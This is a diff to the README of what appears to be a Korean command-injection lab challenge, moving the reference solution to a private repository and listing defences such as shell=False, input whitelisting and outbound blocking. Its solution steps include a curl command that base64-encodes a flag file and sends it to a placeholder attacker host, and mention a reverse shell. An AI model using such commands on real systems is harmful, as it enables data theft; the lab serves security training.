@@ -21,7 +21,7 @@ docker compose up -d --build cmdi-1
 2. 리버스셸 또는 `curl http://공격자/?d=$(cat /command_injection_flag.txt|base64)` 로 OOB 유출.
 3. 디코딩 → flag.
 
-> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)
+> 참조 풀이(강사용)는 비공개 레포에서 별도 관리한다 — 공개 레포에는 포함하지 않는다.
 
 ## 대응방안
 셸 미사용(`shell=False`+인자배열), 입력 화이트리스트, 아웃바운드 차단.
